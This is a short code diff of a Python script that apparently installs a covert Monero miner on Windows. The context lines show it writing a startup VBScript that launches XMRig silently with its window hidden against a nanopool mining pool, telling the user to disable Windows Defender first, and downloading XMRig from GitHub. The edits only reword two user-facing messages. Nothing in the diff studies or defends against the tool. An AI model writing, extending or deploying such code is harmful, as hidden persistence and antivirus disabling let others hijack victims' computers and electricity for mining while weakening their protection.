@@ -39,7 +39,7 @@ def create_startup_vbs(xmrig_path, startup_path, bitcoin_address):
             vbs_file.write(f'Set WshShell = CreateObject("WScript.Shell")\n'
                            f'WshShell.Run """{xmrig_path}"" -o xmr-us-east1.nanopool.org:14433 -u {bitcoin_address} --tls --coin monero", 0, False\n')
     except IOError as e:
-        print(f"Error creating startup VBScript: {e}")
+        print(f"Error creating startup file: {e}")
         return False
     return True
 
@@ -101,7 +101,7 @@ def main():
 
     # Check if Windows Defender is on
     if is_windows_defender_on():
-        show_message_box("Please disable Windows Defender Antivirus protection before running this script.", "Windows Defender Active")
+        show_message_box("Please disable Windows Defender Antivirus protection before running this program.", "Windows Defender Active")
         sys.exit(1)
 
     URL = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-gcc-win64.zip"
